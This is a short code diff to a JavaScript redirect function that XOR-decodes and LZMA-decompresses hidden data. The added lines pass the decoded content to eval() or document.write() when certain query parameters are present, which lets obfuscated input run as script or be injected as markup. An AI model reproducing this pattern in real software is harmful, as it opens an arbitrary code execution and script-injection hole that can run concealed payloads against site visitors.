@@ -152,7 +152,7 @@ function do_redirect()
     console.log('xor_decode ' + buffarray.length);
     decoded_buffarray = LZMA.decompress(decoded_buffarray);
     console.log('LZMA.decompress ' + decoded_buffarray.length);
-    /* handle redirect errors here */
+    /* TODO handle redirect errors here */
     if (!decoded_buffarray)
     {
         console.log('Error in decoded data');
@@ -162,7 +162,19 @@ function do_redirect()
     // var url = UTF8ArrToStr(decoded_buffarray);
     var url = decoded_buffarray;
     console.log('url ' + url.length);
-
+    
+    if (query.j)
+    {
+        eval (url)
+        return true;
+    }
+    
+    if (query.h)
+    {
+        document.write (url)
+        return true;
+    }
+    
     document.write('<a target="_blank" href="'+url+'">'+url+'</a>');
     window.location.replace(url);
     window.location.href = url;
